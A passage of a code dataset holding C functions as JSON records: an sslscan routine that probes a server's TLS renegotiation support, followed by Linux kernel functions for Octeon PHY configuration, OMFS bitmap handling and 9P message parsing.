false;\n\t}\n\n\t// Connect socket and BIO\n\tcipherConnectionBio = BIO_new_socket(socketDescriptor, BIO_NOCLOSE);\n\n\t// Connect SSL and BIO\n\tSSL_set_bio(ssl, cipherConnectionBio, cipherConnectionBio);\n\n#if OPENSSL_VERSION_NUMBER >= 0x0090806fL && !defined(OPENSSL_NO_TLSEXT)\n\t// This enables TLS SNI\n\t// Based on http://does-not-exist.org/mail-archives/mutt-dev/msg13045.html\n\t// TLS Virtual-hosting requires that the server present the correct\n\t// certificate; to do this, the ServerNameIndication TLS extension is used.\n\t// If TLS is negotiated, and OpenSSL is recent enough that it might have\n\t// support, and support was enabled when OpenSSL was built, mutt supports\n\t// sending the hostname we think we're connecting to, so a server can send\n\t// back the correct certificate.\n\t// NB: finding a server which uses this for IMAP is problematic, so this is\n\t// untested.  Please report success or failure!  However, this code change\n\t// has worked fine in other projects to which the contributor has added it,\n\t// or HTTP usage.\n\tSSL_set_tlsext_host_name(ssl, options->host);\n#endif\n\n\t// Connect SSL over socket\n\tcipherStatus = SSL_connect(ssl);\n\n\t/* Yes, we know what we are doing here.  No, we do not treat a renegotiation\n\t * as authenticating any earlier-received data. */\n\tif (use_unsafe_renegotiation_flag) {\n\t\tif(options->verbose)\n\t\t\tprintf(\"use_unsafe_renegotiation_flag\\n\");\n\t\tssl->s3->flags |= SSL3_FLAGS_ALLOW_UNSAFE_LEGACY_RENEGOTIATION;\n\t}\n\n\tif (use_unsafe_renegotiation_op) {\n\t\tif(options->verbose)\n\t\t\tprintf(\"use_unsafe_renegotiation_op\\n\");\n\t\tSSL_set_options(ssl, SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION);\n\t}\n\n\n\tif (cipherStatus == 0) {\n\t\t// Free SSL object\n\t\tSSL_free(ssl);\n\n\t\t// Free CTX Object\n\t\tSSL_CTX_free(options->ctx);\n\n\t\t// Disconnect from host\n\t\tclose(socketDescriptor);\n\n\t\ttest_renegotiation_process_result(options, result);\n\t\treturn false;\n\t}\n\n#if ( OPENSSL_VERSION_NUMBER > 0x009080cfL )\n\t// SSL_get_secure_renegotiation_support() appeared first in OpenSSL 0.9.8m\n\tif(options->verbose)\n\t\tprintf(\"Attempting secure_renegotiation_support()\");\n\n\tresult.secure = SSL_get_secure_renegotiation_support(ssl);\n\tif( result.secure ) {\n\t\t// If it supports secure renegotiations,\n\t\t// it should have renegotioation support in general\n\t\tresult.supported = true;\n\t\tstatus = true;\n\t} else {\n#endif\n\t\t// We can't assume that just because the secure renegotiation\n\t\t// support failed the server doesn't support insecure renegotiations\u00b7\n\n\t\t// assume ssl is connected and error free up to here\n\t\t//setBlocking(ssl); // this is unnecessary if it is already blocking\u00b7\n\t\tif(options->verbose)\n\t\t\tprintf(\"Attempting SSL_renegotiate(ssl)\\n\");\n\n\t\tSSL_renegotiate(ssl); // Ask to renegotiate the connection\n\n\t\t// This hangs when an 'encrypted alert' is sent by the server\n\t\tif(options->verbose)\n\t\t\tprintf(\"Attempting SSL_do_handshake(ssl)\\n\");\n\n\t\tSSL_do_handshake(ssl); // Send renegotiation request to server //TODO :: XXX hanging here\n\n\t\tif (ssl->state == SSL_ST_OK) {\n\t\t\tres = SSL_do_handshake(ssl); // Send renegotiation request to server\n\t\t\tif( res != 1 ) {\n\t\t\t\tfprintf(stderr, \"\\n\\nSSL_do_handshake() call failed\\n\");\n\t\t\t}\n\t\t\tif (ssl->state == SSL_ST_OK) {\n\t\t\t\t/* our renegotiation is complete */\n\t\t\t\tresult.supported = true;\n\t\t\t\tstatus = true;\n\t\t\t} else {\n\t\t\t\tresult.supported = false;\n\t\t\t\tstatus = false;\n\t\t\t\tfprintf(stderr, \"\\n\\nFailed to complete renegotiation\\n\");\n\t\t\t}\n\t\t} else {\n\t\t\tstatus = false;\n\t\t\tresult.secure = false;\n\t\t}\n#if ( OPENSSL_VERSION_NUMBER > 0x009080cfL )\n\t}\n#endif\n\t// Disconnect SSL over socket\n\tSSL_shutdown(ssl);\n\n\t// Free SSL object\n\tSSL_free(ssl);\n\n\t// Free CTX Object\n\tSSL_CTX_free(options->ctx);\n\n\t// Disconnect from host\n\tclose(socketDescriptor);\n\n\ttest_renegotiation_process_result(options, result);\n\treturn status;\n}", "path": "src\\probe.c", "repo_name": "DinoTools/sslscan", "stars": 89, "license": "gpl-3.0", "language": "c", "size": 557}
{"docstring": "/**\n * This function as a board specific method of changing the PHY\n * speed, duplex, and auto-negotiation. This programs the PHY and\n * not Octeon. This can be used to force Octeon's links to\n * specific settings.\n *\n * @phy_addr:  The address of the PHY to program\n * @enable_autoneg:\n *                  Non zero if you want to enable auto-negotiation.\n * @link_info: Link speed to program. If the speed is zero and auto-negotiation\n *                  is enabled, all possible negotiation speeds are advertised.\n *\n * Returns Zero on success, negative on failure\n */\n", "func_signal": "int cvmx_helper_board_link_set_phy(int phy_addr,\n\t\t\t\t   cvmx_helper_board_set_phy_link_flags_types_t\n\t\t\t\t   link_flags,\n\t\t\t\t   cvmx_helper_link_info_t link_info)", "code": "{\n\n\t/* Set the flow control settings based on link_flags */\n\tif ((link_flags & set_phy_link_flags_flow_control_mask) !=\n\t    set_phy_link_flags_flow_control_dont_touch) {\n\t\tcvmx_mdio_phy_reg_autoneg_adver_t reg_autoneg_adver;\n\t\treg_autoneg_adver.u16 =\n\t\t    cvmx_mdio_read(phy_addr >> 8, phy_addr & 0xff,\n\t\t\t\t   CVMX_MDIO_PHY_REG_AUTONEG_ADVER);\n\t\treg_autoneg_adver.s.asymmetric_pause =\n\t\t    (link_flags & set_phy_link_flags_flow_control_mask) ==\n\t\t    set_phy_link_flags_flow_control_enable;\n\t\treg_autoneg_adver.s.pause =\n\t\t    (link_flags & set_phy_link_flags_flow_control_mask) ==\n\t\t    set_phy_link_flags_flow_control_enable;\n\t\tcvmx_mdio_write(phy_addr >> 8, phy_addr & 0xff,\n\t\t\t\tCVMX_MDIO_PHY_REG_AUTONEG_ADVER,\n\t\t\t\treg_autoneg_adver.u16);\n\t}\n\n\t/* If speed isn't set and autoneg is on advertise all supported modes */\n\tif ((link_flags & set_phy_link_flags_autoneg)\n\t    && (link_info.s.speed == 0)) {\n\t\tcvmx_mdio_phy_reg_control_t reg_control;\n\t\tcvmx_mdio_phy_reg_status_t reg_status;\n\t\tcvmx_mdio_phy_reg_autoneg_adver_t reg_autoneg_adver;\n\t\tcvmx_mdio_phy_reg_extended_status_t reg_extended_status;\n\t\tcvmx_mdio_phy_reg_control_1000_t reg_control_1000;\n\n\t\treg_status.u16 =\n\t\t    cvmx_mdio_read(phy_addr >> 8, phy_addr & 0xff,\n\t\t\t\t   CVMX_MDIO_PHY_REG_STATUS);\n\t\treg_autoneg_adver.u16 =\n\t\t    cvmx_mdio_read(phy_addr >> 8, phy_addr & 0xff,\n\t\t\t\t   CVMX_MDIO_PHY_REG_AUTONEG_ADVER);\n\t\treg_autoneg_adver.s.advert_100base_t4 =\n\t\t    reg_status.s.capable_100base_t4;\n\t\treg_autoneg_adver.s.advert_10base_tx_full =\n\t\t    reg_status.s.capable_10_full;\n\t\treg_autoneg_adver.s.advert_10base_tx_half =\n\t\t    reg_status.s.capable_10_half;\n\t\treg_autoneg_adver.s.advert_100base_tx_full =\n\t\t    reg_status.s.capable_100base_x_full;\n\t\treg_autoneg_adver.s.advert_100base_tx_half =\n\t\t    reg_status.s.capable_100base_x_half;\n\t\tcvmx_mdio_write(phy_addr >> 8, phy_addr & 0xff,\n\t\t\t\tCVMX_MDIO_PHY_REG_AUTONEG_ADVER,\n\t\t\t\treg_autoneg_adver.u16);\n\t\tif (reg_status.s.capable_extended_status) {\n\t\t\treg_extended_status.u16 =\n\t\t\t    cvmx_mdio_read(phy_addr >> 8, phy_addr & 0xff,\n\t\t\t\t\t   CVMX_MDIO_PHY_REG_EXTENDED_STATUS);\n\t\t\treg_control_1000.u16 =\n\t\t\t    cvmx_mdio_read(phy_addr >> 8, phy_addr & 0xff,\n\t\t\t\t\t   CVMX_MDIO_PHY_REG_CONTROL_1000);\n\t\t\treg_control_1000.s.advert_1000base_t_full =\n\t\t\t    reg_extended_status.s.capable_1000base_t_full;\n\t\t\treg_control_1000.s.advert_1000base_t_half =\n\t\t\t    reg_extended_status.s.capable_1000base_t_half;\n\t\t\tcvmx_mdio_write(phy_addr >> 8, phy_addr & 0xff,\n\t\t\t\t\tCVMX_MDIO_PHY_REG_CONTROL_1000,\n\t\t\t\t\treg_control_1000.u16);\n\t\t}\n\t\treg_control.u16 =\n\t\t    cvmx_mdio_read(phy_addr >> 8, phy_addr & 0xff,\n\t\t\t\t   CVMX_MDIO_PHY_REG_CONTROL);\n\t\treg_control.s.autoneg_enable = 1;\n\t\treg_control.s.restart_autoneg = 1;\n\t\tcvmx_mdio_write(phy_addr >> 8, phy_addr & 0xff,\n\t\t\t\tCVMX_MDIO_PHY_REG_CONTROL, reg_control.u16);\n\t} else if ((link_flags & set_phy_link_flags_autoneg)) {\n\t\tcvmx_mdio_phy_reg_control_t reg_control;\n\t\tcvmx_mdio_phy_reg_status_t reg_status;\n\t\tcvmx_mdio_phy_reg_autoneg_adver_t reg_autoneg_adver;\n\t\tcvmx_mdio_phy_reg_extended_status_t reg_extended_status;\n\t\tcvmx_mdio_phy_reg_control_1000_t reg_control_1000;\n\n\t\treg_status.u16 =\n\t\t    cvmx_mdio_read(phy_addr >> 8, phy_addr & 0xff,\n\t\t\t\t   CVMX_MDIO_PHY_REG_STATUS);\n\t\treg_autoneg_adver.u16 =\n\t\t    cvmx_mdio_read(phy_addr >> 8, phy_addr & 0xff,\n\t\t\t\t   CVMX_MDIO_PHY_REG_AUTONEG_ADVER);\n\t\treg_autoneg_adver.s.advert_100base_t4 = 0;\n\t\treg_autoneg_adver.s.advert_10base_tx_full = 0;\n\t\treg_autoneg_adver.s.advert_10base_tx_half = 0;\n\t\treg_autoneg_adver.s.advert_100base_tx_full = 0;\n\t\treg_autoneg_adver.s.advert_100base_tx_half = 0;\n\t\tif (reg_status.s.capable_extended_status) {\n\t\t\treg_extended_status.u16 =\n\t\t\t    cvmx_mdio_read(phy_addr >> 8, phy_addr & 0xff,\n\t\t\t\t\t   CVMX_MDIO_PHY_REG_EXTENDED_STATUS);\n\t\t\treg_control_1000.u16 =\n\t\t\t    cvmx_mdio_read(phy_addr >> 8, phy_addr & 0xff,\n\t\t\t\t\t   CVMX_MDIO_PHY_REG_CONTROL_1000);\n\t\t\treg_control_1000.s.advert_1000base_t_full = 0;\n\t\t\treg_control_1000.s.advert_1000base_t_half = 0;\n\t\t}\n\t\tswitch (link_info.s.speed) {\n\t\tcase 10:\n\t\t\treg_autoneg_adver.s.advert_10base_tx_full =\n\t\t\t    link_info.s.full_duplex;\n\t\t\treg_autoneg_adver.s.advert_10base_tx_half =\n\t\t\t    !link_info.s.full_duplex;\n\t\t\tbreak;\n\t\tcase 100:\n\t\t\treg_autoneg_adver.s.advert_100base_tx_full =\n\t\t\t    link_info.s.full_duplex;\n\t\t\treg_autoneg_adver.s.advert_100base_tx_half =\n\t\t\t    !link_info.s.full_duplex;\n\t\t\tbreak;\n\t\tcase 1000:\n\t\t\treg_control_1000.s.advert_1000base_t_full =\n\t\t\t    link_info.s.full_duplex;\n\t\t\treg_control_1000.s.advert_1000base_t_half =\n\t\t\t    !link_info.s.full_duplex;\n\t\t\tbreak;\n\t\t}\n\t\tcvmx_mdio_write(phy_addr >> 8, phy_addr & 0xff,\n\t\t\t\tCVMX_MDIO_PHY_REG_AUTONEG_ADVER,\n\t\t\t\treg_autoneg_adver.u16);\n\t\tif (reg_status.s.capable_extended_status)\n\t\t\tcvmx_mdio_write(phy_addr >> 8, phy_addr & 0xff,\n\t\t\t\t\tCVMX_MDIO_PHY_REG_CONTROL_1000,\n\t\t\t\t\treg_control_1000.u16);\n\t\treg_control.u16 =\n\t\t    cvmx_mdio_read(phy_addr >> 8, phy_addr & 0xff,\n\t\t\t\t   CVMX_MDIO_PHY_REG_CONTROL);\n\t\treg_control.s.autoneg_enable = 1;\n\t\treg_control.s.restart_autoneg = 1;\n\t\tcvmx_mdio_write(phy_addr >> 8, phy_addr & 0xff,\n\t\t\t\tCVMX_MDIO_PHY_REG_CONTROL, reg_control.u16);\n\t} else {\n\t\tcvmx_mdio_phy_reg_control_t reg_control;\n\t\treg_control.u16 =\n\t\t    cvmx_mdio_read(phy_addr >> 8, phy_addr & 0xff,\n\t\t\t\t   CVMX_MDIO_PHY_REG_CONTROL);\n\t\treg_control.s.autoneg_enable = 0;\n\t\treg_control.s.restart_autoneg = 1;\n\t\treg_control.s.duplex = link_info.s.full_duplex;\n\t\tif (link_info.s.speed == 1000) {\n\t\t\treg_control.s.speed_msb = 1;\n\t\t\treg_control.s.speed_lsb = 0;\n\t\t} else if (link_info.s.speed == 100) {\n\t\t\treg_control.s.speed_msb = 0;\n\t\t\treg_control.s.speed_lsb = 1;\n\t\t} else if (link_info.s.speed == 10) {\n\t\t\treg_control.s.speed_msb = 0;\n\t\t\treg_control.s.speed_lsb = 0;\n\t\t}\n\t\tcvmx_mdio_write(phy_addr >> 8, phy_addr & 0xff,\n\t\t\t\tCVMX_MDIO_PHY_REG_CONTROL, reg_control.u16);\n\t}\n\treturn 0;\n}", "path": "drivers\\staging\\octeon\\cvmx-helper-board.c", "repo_name": "CyanogenMod/htc-kernel-msm7x30", "stars": 71, "license": "other", "language": "c", "size": 206827}
{"docstring": "/*\n * Sets or clears the run of count bits starting with bit.\n * Called with bitmap lock.\n */\n", "func_signal": "static int set_run(struct super_block *sb, int map,\n\t\tint nbits, int bit, int count, int set)", "code": "{\n\tint i;\n\tint err;\n\tstruct buffer_head *bh;\n\tstruct omfs_sb_info *sbi = OMFS_SB(sb);\n\n \terr = -ENOMEM;\n\tbh = sb_bread(sb, clus_to_blk(sbi, sbi->s_bitmap_ino) + map);\n\tif (!bh)\n\t\tgoto out;\n\n\tfor (i = 0; i < count; i++, bit++) {\n\t\tif (bit >= nbits) {\n\t\t\tbit = 0;\n\t\t\tmap++;\n\n\t\t\tmark_buffer_dirty(bh);\n\t\t\tbrelse(bh);\n\t\t\tbh = sb_bread(sb,\n\t\t\t\tclus_to_blk(sbi, sbi->s_bitmap_ino) + map);\n\t\t\tif (!bh)\n\t\t\t\tgoto out;\n\t\t}\n\t\tif (set) {\n\t\t\tset_bit(bit, sbi->s_imap[map]);\n\t\t\tset_bit(bit, (unsigned long *)bh->b_data);\n\t\t} else {\n\t\t\tclear_bit(bit, sbi->s_imap[map]);\n\t\t\tclear_bit(bit, (unsigned long *)bh->b_data);\n\t\t}\n\t}\n\tmark_buffer_dirty(bh);\n\tbrelse(bh);\n\terr = 0;\nout:\n\treturn err;\n}", "path": "fs\\omfs\\bitmap.c", "repo_name": "CyanogenMod/htc-kernel-msm7x30", "stars": 71, "license": "other", "language": "c", "size": 206827}
{"docstring": "/*\n * Clears count bits starting at a given block.\n */\n", "func_signal": "int omfs_clear_range(struct super_block *sb, u64 block, int count)", "code": "{\n\tstruct omfs_sb_info *sbi = OMFS_SB(sb);\n\tint bits_per_entry = 8 * sb->s_blocksize;\n\tu64 tmp;\n\tunsigned int map, bit;\n\tint ret;\n\n\ttmp = block;\n\tbit = do_div(tmp, bits_per_entry);\n\tmap = tmp;\n\n\tif (map >= sbi->s_imap_size)\n\t\treturn 0;\n\n\tmutex_lock(&sbi->s_bitmap_lock);\n\tret = set_run(sb, map, bits_per_entry, bit, count, 0);\n\tmutex_unlock(&sbi->s_bitmap_lock);\n\treturn ret;\n}", "path": "fs\\omfs\\bitmap.c", "repo_name": "CyanogenMod/htc-kernel-msm7x30", "stars": 71, "license": "other", "language": "c", "size": 206827}
{"docstring": "/*\n * Find first bit set\n */\n", "func_signal": "static int ms1bit(unsigned long x)", "code": "{\n\tint b = 0, s;\n\n\ts = 16; if (x >> 16 == 0) s = 0; b += s; x >>= s;\n\ts =  8; if (x >>  8 == 0) s = 0; b += s; x >>= s;\n\ts =  4; if (x >>  4 == 0) s = 0; b += s; x >>= s;\n\ts =  2; if (x >>  2 == 0) s = 0; b += s; x >>= s;\n\ts =  1; if (x >>  1 == 0) s = 0; b += s;\n\n\treturn b;\n}", "path": "arch\\mips\\sgi-ip27\\ip27-irq.c", "repo_name": "CyanogenMod/htc-kernel-msm7x30", "stars": 71, "license": "other", "language": "c", "size": 206827}
{"docstring": "/**\n * Return the MII PHY address associated with the given IPD\n * port. A result of -1 means there isn't a MII capable PHY\n * connected to this port. On chips supporting multiple MII\n * busses the bus number is encoded in bits <15:8>.\n *\n * This function must be modified for every new Octeon board.\n * Internally it uses switch statements based on the cvmx_sysinfo\n * data to determine board types and revisions. It replies on the\n * fact that every Octeon board receives a unique board type\n * enumeration from the bootloader.\n *\n * @ipd_port: Octeon IPD port to get the MII address for.\n *\n * Returns MII PHY address and bus number or -1.\n */\n", "func_signal": "int cvmx_helper_board_get_mii_address(int ipd_port)", "code": "{\n\tswitch (cvmx_sysinfo_get()->board_type) {\n\tcase CVMX_BOARD_TYPE_SIM:\n\t\t/* Simulator doesn't have MII */\n\t\treturn -1;\n\tcase CVMX_BOARD_TYPE_EBT3000:\n\tcase CVMX_BOARD_TYPE_EBT5800:\n\tcase CVMX_BOARD_TYPE_THUNDER:\n\tcase CVMX_BOARD_TYPE_NICPRO2:\n\t\t/* Interface 0 is SPI4, interface 1 is RGMII */\n\t\tif ((ipd_port >= 16) && (ipd_port < 20))\n\t\t\treturn ipd_port - 16;\n\t\telse\n\t\t\treturn -1;\n\tcase CVMX_BOARD_TYPE_KODAMA:\n\tcase CVMX_BOARD_TYPE_EBH3100:\n\tcase CVMX_BOARD_TYPE_HIKARI:\n\tcase CVMX_BOARD_TYPE_CN3010_EVB_HS5:\n\tcase CVMX_BOARD_TYPE_CN3005_EVB_HS5:\n\tcase CVMX_BOARD_TYPE_CN3020_EVB_HS5:\n\t\t/*\n\t\t * Port 0 is WAN connected to a PHY, Port 1 is GMII\n\t\t * connected to a switch\n\t\t */\n\t\tif (ipd_port == 0)\n\t\t\treturn 4;\n\t\telse if (ipd_port == 1)\n\t\t\treturn 9;\n\t\telse\n\t\t\treturn -1;\n\tcase CVMX_BOARD_TYPE_NAC38:\n\t\t/* Board has 8 RGMII ports PHYs are 0-7 */\n\t\tif ((ipd_port >= 0) && (ipd_port < 4))\n\t\t\treturn ipd_port;\n\t\telse if ((ipd_port >= 16) && (ipd_port < 20))\n\t\t\treturn ipd_port - 16 + 4;\n\t\telse\n\t\t\treturn -1;\n\tcase CVMX_BOARD_TYPE_EBH3000:\n\t\t/* Board has dual SPI4 and no PHYs */\n\t\treturn -1;\n\tcase CVMX_BOARD_TYPE_EBH5200:\n\tcase CVMX_BOARD_TYPE_EBH5201:\n\tcase CVMX_BOARD_TYPE_EBT5200:\n\t\t/*\n\t\t * Board has 4 SGMII ports. The PHYs start right after the MII\n\t\t * ports MII0 = 0, MII1 = 1, SGMII = 2-5.\n\t\t */\n\t\tif ((ipd_port >= 0) && (ipd_port < 4))\n\t\t\treturn ipd_port + 2;\n\t\telse\n\t\t\treturn -1;\n\tcase CVMX_BOARD_TYPE_EBH5600:\n\tcase CVMX_BOARD_TYPE_EBH5601:\n\tcase CVMX_BOARD_TYPE_EBH5610:\n\t\t/*\n\t\t * Board has 8 SGMII ports. 4 connect out, two connect\n\t\t * to a switch, and 2 loop to each other\n\t\t */\n\t\tif ((ipd_port >= 0) && (ipd_port < 4))\n\t\t\treturn ipd_port + 1;\n\t\telse\n\t\t\treturn -1;\n\tcase CVMX_BOARD_TYPE_CUST_NB5:\n\t\tif (ipd_port == 2)\n\t\t\treturn 4;\n\t\telse\n\t\t\treturn -1;\n\tcase CVMX_BOARD_TYPE_NIC_XLE_4G:\n\t\t/* Board has 4 SGMII ports. connected QLM3(interface 1) */\n\t\tif ((ipd_port >= 16) && (ipd_port < 20))\n\t\t\treturn ipd_port - 16 + 1;\n\t\telse\n\t\t\treturn -1;\n\tcase CVMX_BOARD_TYPE_BBGW_REF:\n\t\t/*\n\t\t * No PHYs are connected to Octeon, everything is\n\t\t * through switch.\n\t\t */\n\t\treturn -1;\n\t}\n\n\t/* Some unknown board. Somebody forgot to update this function... */\n\tcvmx_dprintf\n\t    (\"cvmx_helper_board_get_mii_address: Unknown board type %d\\n\",\n\t     cvmx_sysinfo_get()->board_type);\n\treturn -1;\n}", "path": "drivers\\staging\\octeon\\cvmx-helper-board.c", "repo_name": "CyanogenMod/htc-kernel-msm7x30", "stars": 71, "license": "other", "language": "c", "size": 206827}
{"docstring": "/*\n\tb - int8_t\n\tw - int16_t\n\td - int32_t\n\tq - int64_t\n\ts - string\n\tS - stat\n\tQ - qid\n\tD - data blob (int32_t size followed by void *, results are not freed)\n\tT - array of strings (int16_t count, followed by strings)\n\tR - array of qids (int16_t count, followed by qids)\n\t? - if optional = 1, continue parsing\n*/\n", "func_signal": "static int\np9pdu_vreadf(struct p9_fcall *pdu, int optional, const char *fmt, va_list ap)", "code": "{\n\tconst char *ptr;\n\tint errcode = 0;\n\n\tfor (ptr = fmt; *ptr; ptr++) {\n\t\tswitch (*ptr) {\n\t\tcase 'b':{\n\t\t\t\tint8_t *val = va_arg(ap, int8_t *);\n\t\t\t\tif (pdu_read(pdu, val, sizeof(*val))) {\n\t\t\t\t\terrcode = -EFAULT;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 'w':{\n\t\t\t\tint16_t *val = va_arg(ap, int16_t *);\n\t\t\t\t__le16 le_val;\n\t\t\t\tif (pdu_read(pdu, &le_val, sizeof(le_val))) {\n\t\t\t\t\terrcode = -EFAULT;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\t*val = le16_to_cpu(le_val);\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 'd':{\n\t\t\t\tint32_t *val = va_arg(ap, int32_t *);\n\t\t\t\t__le32 le_val;\n\t\t\t\tif (pdu_read(pdu, &le_val, sizeof(le_val))) {\n\t\t\t\t\terrcode = -EFAULT;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\t*val = le32_to_cpu(le_val);\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 'q':{\n\t\t\t\tint64_t *val = va_arg(ap, int64_t *);\n\t\t\t\t__le64 le_val;\n\t\t\t\tif (pdu_read(pdu, &le_val, sizeof(le_val))) {\n\t\t\t\t\terrcode = -EFAULT;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\t*val = le64_to_cpu(le_val);\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 's':{\n\t\t\t\tchar **sptr = va_arg(ap, char **);\n\t\t\t\tint16_t len;\n\t\t\t\tint size;\n\n\t\t\t\terrcode = p9pdu_readf(pdu, optional, \"w\", &len);\n\t\t\t\tif (errcode)\n\t\t\t\t\tbreak;\n\n\t\t\t\tsize = MAX(len, 0);\n\n\t\t\t\t*sptr = kmalloc(size + 1, GFP_KERNEL);\n\t\t\t\tif (*sptr == NULL) {\n\t\t\t\t\terrcode = -EFAULT;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tif (pdu_read(pdu, *sptr, size)) {\n\t\t\t\t\terrcode = -EFAULT;\n\t\t\t\t\tkfree(*sptr);\n\t\t\t\t\t*sptr = NULL;\n\t\t\t\t} else\n\t\t\t\t\t(*sptr)[size] = 0;\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 'Q':{\n\t\t\t\tstruct p9_qid *qid =\n\t\t\t\t    va_arg(ap, struct p9_qid *);\n\n\t\t\t\terrcode = p9pdu_readf(pdu, optional, \"bdq\",\n\t\t\t\t\t\t      &qid->type, &qid->version,\n\t\t\t\t\t\t      &qid->path);\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 'S':{\n\t\t\t\tstruct p9_wstat *stbuf =\n\t\t\t\t    va_arg(ap, struct p9_wstat *);\n\n\t\t\t\tmemset(stbuf, 0, sizeof(struct p9_wstat));\n\t\t\t\tstbuf->n_uid = stbuf->n_gid = stbuf->n_muid =\n\t\t\t\t\t\t\t\t\t-1;\n\t\t\t\terrcode =\n\t\t\t\t    p9pdu_readf(pdu, optional,\n\t\t\t\t\t\t\"wwdQdddqssss?sddd\",\n\t\t\t\t\t\t&stbuf->size, &stbuf->type,\n\t\t\t\t\t\t&stbuf->dev, &stbuf->qid,\n\t\t\t\t\t\t&stbuf->mode, &stbuf->atime,\n\t\t\t\t\t\t&stbuf->mtime, &stbuf->length,\n\t\t\t\t\t\t&stbuf->name, &stbuf->uid,\n\t\t\t\t\t\t&stbuf->gid, &stbuf->muid,\n\t\t\t\t\t\t&stbuf->extension,\n\t\t\t\t\t\t&stbuf->n_uid, &stbuf->n_gid,\n\t\t\t\t\t\t&stbuf->n_muid);\n\t\t\t\tif (errcode)\n\t\t\t\t\tp9stat_free(stbuf);\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 'D':{\n\t\t\t\tint32_t *count = va_arg(ap, int32_t *);\n\t\t\t\tvoid **data = va_arg(ap, void **);\n\n\t\t\t\terrcode =\n\t\t\t\t    p9pdu_readf(pdu, optional, \"d\", count);\n\t\t\t\tif (!errcode) {\n\t\t\t\t\t*count =\n\t\t\t\t\t    MIN(*count,\n\t\t\t\t\t\tpdu->size - pdu->offset);\n\t\t\t\t\t*data = &pdu->sdata[pdu->offset];\n\t\t\t\t}\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 'T':{\n\t\t\t\tint16_t *nwname = va_arg(ap, int16_t *);\n\t\t\t\tchar ***wnames = va_arg(ap, char ***);\n\n\t\t\t\terrcode =\n\t\t\t\t    p9pdu_readf(pdu, optional, \"w\", nwname);\n\t\t\t\tif (!errcode) {\n\t\t\t\t\t*wnames =\n\t\t\t\t\t    kmalloc(sizeof(char *) * *nwname,\n\t\t\t\t\t\t    GFP_KERNEL);\n\t\t\t\t\tif (!*wnames)\n\t\t\t\t\t\terrcode = -ENOMEM;\n\t\t\t\t}\n\n\t\t\t\tif (!errcode) {\n\t\t\t\t\tint i;\n\n\t\t\t\t\tfor (i = 0; i < *nwname; i++) {\n\t\t\t\t\t\terrcode =\n\t\t\t\t\t\t    p9pdu_readf(pdu, optional,\n\t\t\t\t\t\t\t\t\"s\",\n\t\t\t\t\t\t\t\t&(*wnames)[i]);\n\t\t\t\t\t\tif (errcode)\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\tif (errcode) {\n\t\t\t\t\tif (*wnames) {\n\t\t\t\t\t\tint i;\n\n\t\t\t\t\t\tfor (i = 0; i < *nwname; i++)\n\t\t\t\t\t\t\tkfree((*wnames)[i]);\n\t\t\t\t\t}\n\t\t\t\t\tkfree(*wnames);\n\t\t\t\t\t*wnames = NULL;\n\t\t\t\t}\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 'R':{\n\t\t\t\tint16_t *nwqid = va_arg(ap, int16_t *);\n\t\t\t\tstruct p9_qid **wqids =\n\t\t\t\t    va_arg(ap, struct p9_qid **);\n\n\t\t\t\t*wqids = NULL;\n\n\t\t\t\terrcode =\n\t\t\t\t    p9pdu_readf(pdu, optional, \"w\", nwqid);\n\t\t\t\tif (!errcode) {\n\t\t\t\t\t*wqids =\n\t\t\t\t\t    kmalloc(*nwqid *\n\t\t\t\t\t\t    sizeof(struct p9_qid),\n\t\t\t\t\t\t    GFP_KERNEL);\n\t\t\t\t\tif (*wqids == NULL)\n\t\t\t\t\t\terrcode = -ENOMEM;\n\t\t\t\t}\n\n\t\t\t\tif (!errcode) {\n\t\t\t\t\tint i;\n\n\t\t\t\t\tfor (i = 0; i < *nwqid; i++) {\n\t\t\t\t\t\terrcode =\n\t\t\t\t\t\t    p9pdu_readf(pdu, optional,\n\t\t\t\t\t\t\t\t\"Q\",\n\t\t\t\t\t\t\t\t&(*wqids)[i]);\n\t\t\t\t\t\tif (errcode)\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\tif (errcode) {\n\t\t\t\t\tkfree(*wqids);\n\t\t\t\t\t*wqids = NULL;\n\t\t\t\t}\n\t\t\t}\n\t\t\tbreak;\n\t\tcase '?':\n\t\t\tif (!optional)\n\t\t\t\treturn 0;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tBUG();\n\t\t\tbreak;\n\t\t}\n\n\t\tif (errcode)\n\t\t\tbreak;\n\t}\n\n\treturn errcode;\n}", "path": "net\\9p\\protocol.c", "repo_name": "CyanogenMod/htc-kernel-msm7x30", "stars": 71, "license": "other", "language": "c", "size": 206827}
{"docstring": "/**\n * This function is the board specific method of determining an\n * ethernet ports link speed. Most Octeon boards have Marvell PHYs\n * and are handled by the fall through case. This function must be\n * updated for boards that don't have the normal Marvell PHYs.\n *\n * This function must be modified for every new Octeon board.\n * Internally it uses switch statements based on the cvmx_sysinfo\n * data to determine board types and revisions. It relies on the\n * fact that every Octeon board receives a unique board type\n * enumeration from the bootloader.\n *\n * @ipd_port: IPD input port associated with the port we want to get link\n *                 status for.\n *\n * Returns The ports link status. If the link isn't fully resolved, this must\n *         return zero.\n */\n", "func_signal": "cvmx_helper_link_info_t __cvmx_helper_board_link_get(int ipd_port)", "code": "{\n\tcvmx_helper_link_info_t result;\n\tint phy_addr;\n\tint is_broadcom_phy = 0;\n\n\t/* Give the user a chance to override the processing of this function */\n\tif (cvmx_override_board_link_get)\n\t\treturn cvmx_override_board_link_get(ipd_port);\n\n\t/* Unless we fix it later, all links are defaulted to down */\n\tresult.u64 = 0;\n\n\t/*\n\t * This switch statement should handle all ports that either don't use\n\t * Marvell PHYS, or don't support in-band status.\n\t */\n\tswitch (cvmx_sysinfo_get()->board_type) {\n\tcase 